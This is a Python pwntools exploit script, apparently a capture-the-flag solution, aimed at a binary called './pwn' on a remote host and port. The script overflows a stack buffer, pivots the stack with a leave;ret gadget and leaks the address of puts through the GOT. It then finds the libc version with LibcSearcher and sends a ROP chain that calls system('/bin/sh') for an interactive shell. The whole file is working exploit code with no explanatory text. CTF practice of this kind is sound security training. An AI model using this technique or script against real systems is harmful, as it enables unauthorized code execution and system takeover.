from pwn import * 
from pwn import p64,u64
from LibcSearcher import *

debug = 0
gdb_is = 0
# context(arch='i386',os = 'linux')
context(arch='amd64',os = 'linux', log_level='DEBUG')
if debug:
    context.terminal = ['/mnt/c/Users/sagiriking/AppData/Local/Microsoft/WindowsApps/wt.exe','nt','Ubuntu','-c']
    if not gdb_is:
        r = process("./pwn")
    
else:
    host = "123.56.9.101:19982"
    r = connect(host.split(':')[0],host.split(':')[1])#远程连接
    gdb_is =0

ret = 0x000401268
if gdb_is:
    r = gdb.debug("./pwn",f'b *{ret}')
    # pause()
    pass
stack = 0x004050A0
pop_rdi = 0x00401353
main_addr = 0x00401264
leave_ret = 0x0040124B

elf = ELF('./pwn')

payload = b'A'* 0x30 + p64(stack-8) + p64(leave_ret)  
r.sendafter(b'again!\n',p64(pop_rdi) + p64(elf.got['puts']) + p64(elf.sym['puts']) + p64(ret))
time.sleep(1)
r.sendafter(b'number',b'\x12\x34\x56\x78'[::-1])
time.sleep(1)
r.sendafter(b'TaiCooLa',payload)

addr = r.recv(6).ljust(8,b'\x00')
puts_addr = u64(addr)
info(f'puts_addr -> {hex(puts_addr)}')
libc = LibcSearcher('puts',puts_addr)
offser = puts_addr - libc.dump('puts')
binsh = offser + libc.dump('str_bin_sh')
system = offser + libc.dump('system')

r.send(p64(pop_rdi) + p64(binsh) + p64(system))


r.interactive()

